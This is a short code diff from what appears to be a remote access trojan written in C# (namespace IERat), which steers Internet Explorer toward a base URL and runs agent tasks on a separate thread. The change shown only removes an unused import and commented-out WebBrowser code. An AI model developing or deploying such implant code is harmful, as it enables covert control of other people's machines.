@@ -10,7 +10,6 @@ using System.Web.Script.Serialization;
 using IERat.lib.Actions;
 using System.Reflection;
 using System.Collections.Generic;
-using System.Windows.Forms;
 
 namespace IERat.lib
 {
@@ -24,14 +23,12 @@ namespace IERat.lib
         }
         public string Status { get; set; }
         public bool IEvisible { get; set; }
-        //WebBrowser WebBrowser { get; set; }
         public Agent Agent { get; set; }
         InternetExplorer InternetExplorer { get; set; }
         public string CurrentRequest { get; set; }
         public string BaseURL { get; set; }
         public int SleepTime { get; set; }
         void DocumentComplete(object pDisp, ref object URL)
-        //void OnDocumentComplete(object sender, WebBrowserDocumentCompletedEventArgs e)
         {
             if (InternetExplorer.LocationURL.Contains(this.BaseURL))
             {
@@ -57,8 +54,6 @@ namespace IERat.lib
         public void Open()
         {
             InternetExplorer.DocumentComplete += new DWebBrowserEvents2_DocumentCompleteEventHandler(DocumentComplete);
-            //WebBrowser = new SHDocVw.WebBrowser();
-            //WebBrowser.DocumentComplete += OnDocumentComplete;
             Thread thread = new Thread(new ThreadStart(Start));
             thread.Start();
             Thread ExecuteAgentTasksThread = new Thread(new ThreadStart(ExecuteAgentTasks));
